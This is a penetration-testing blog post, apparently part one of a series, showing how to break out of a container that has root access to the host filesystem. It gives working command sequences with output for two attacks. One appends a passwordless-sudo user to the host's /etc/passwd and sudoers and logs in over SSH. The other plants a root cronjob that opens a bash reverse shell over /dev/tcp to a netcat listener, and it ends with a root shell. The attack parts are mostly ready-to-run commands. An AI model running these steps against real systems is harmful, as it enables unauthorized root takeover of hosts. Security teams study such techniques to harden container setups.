---
title: "Container Breakouts – Part 1: Access to root filesystem of the Host"
date: 2020-07-12T10:39:10+02:00
draft: true
---

This post is part of a series and shows container breakout techniques that can be performed if a container is started with access to the host root filesystem.

<!--more-->

Following posts are part of the series:
- Part 1: Access to root filesystem of the Host
- [Part 2: Privileged Container](../container-breakouts-part2)
- [Part 3: Docker Socket](../container-breakouts-part3)

## Intro

The motivation of this post is to collect container breakouts. I was considering writing a huge post about all the stuff you must know to break out of container. But, if I would do so, it will take ages to write, es well to read and at the end you would just scroll direct to the PoC code snippets. So I dropped that idea and will just link to additional readings.

As well, I realized during writing that the post must be sliced into digestible pieces. 

The first post is about what could probably go wrong if the host root filesystem is accessible from the container. Do to the fact that we have only access to the disc, this approach is absolutely not an OpSec-safe approach to escalate your privileges. 

## Shared Host root-directory

If you got access to a container that shares directories with the host, that is not direct a problem. But, if the container has access to the host root-filesystem as user root (pre-assumed that there is no [AppArmor](https://man.cx/apparmor(7)) or [SELinux](https://man7.org/linux/man-pages/man8/selinux.8.html) in place) you got the jack pot! We have multiple ways to approach the underlying host.

Let’s assume that the host root directory is accessible at `/hostfs`

### SSH to user

To escalate to the host, we **create a user** in the file `/hostfs/etc/passwd` and **add** the user **to** the **sudoer’s**. After the user is prepared, we connect via **SSH** to the host. Okay, it is a kind of constructed, because certain packages must have been installed and services running, but you get the idea.

Here are all steps that must be performed (we start in the container).


```
# cat /hostfs/etc/passwd | grep 1000
user:x:1000:1001:user:/home/user:/usr/bin/zsh

# openssl passwd -6 -salt xyz test
$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0

# echo 'foo:$6$xyz$rjarwc/BNZWcH6B31aAXWo1942.i7rCX5AT/oxALL5gCznYVGKh6nycQVZiHDVbnbu0BsQyPfBgqYveKcCgOE0:1000:1001:user:/home/user:/usr/bin/zsh' | tee -a /hostfs/etc/passwd

# echo "user ALL=(ALL) NOPASSWD: ALL" >> /hostfs/etc/sudoers.d/0-user

# ip r 
default via 172.17.0.1 dev eth0 
172.17.0.0/16 dev eth0 proto kernel scope link src 172.17.0.2

# ssh -l foo 127.0.0.1
foo@127.0.0.1's password: 
Last login: Sat Jul 11 12:10:10 2020 from 127.0.0.1
arch [~]% sudo -i
[arch ~]# 
```

We have assumed that there is an SSH daemon running on the host, the service is not hardened and the `sudo` package was installed. Well, you could exchange the sudo-step by creating another user with `uid=0(root)` to get rid of that step, but anyway.

### Cronjob

Due to the fact that in a default setup the container is direct connected to the host, we can initiate not only connections from the container to the host, also vice-versa. To do so, we need the IP address from the container. Depending on the binaries that are available on the host, we initiate a reverse shell by a cronjob that connects to an exposed port on the container. In this showcase, we use `bash` for the reverse connection and `netcat` to handle the connection in the container. The following line is all we need:

```
* * * * * root bash -i >& /dev/tcp/$CONTAINER_IP/$CONTAINER_PORT 0>&1
```

The cronjob is executed every minute as user `root` on the host. So, as soon as the cronjob gets trigger, we are getting root access to the host system. 

Here are all steps that must be performed (we start in the container).

```
# ip a
[…]
6: eth0@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
[…]

# echo "* * * * * root bash -i >& /dev/tcp/172.17.0.2/1337 0>&1" | tee /hostfs/etc/cron.d/1revers
# nc -lkvp 1337
nc -lvkp 1337
listening on [any] 1337 ...
172.17.0.1: inverse host lookup failed: Unknown host
connect to [172.17.0.2] from (UNKNOWN) [172.17.0.1] 58536
bash: cannot set terminal process group (3138): Inappropriate ioctl for device
bash: no job control in this shell
[arch ~]# id -a
uid=0(root) gid=0(root) groups=0(root)
```

In this second showcase, we assumed that a cron service was running on the host. That is more or less the default on a lot of systems. 

## Conclusion

Both examples are approaches to get direct access to host system. They are modifying the host and absolutely not minimal-inversive or OpSec-safe. If you make mistakes, you may mix up the configuration of the host system and crash it. Be careful!

Furthermore, the proposed techniques are possible approaches to escape out of a container. I may update the list from time-to-time. If you have important approaches that you think they should be listed, do not hesitate and get in touch.

If you are interested in further, less riotous continue with the next post [Container Breakouts – Part 2: Privileged Container](../container-breakouts-part2).

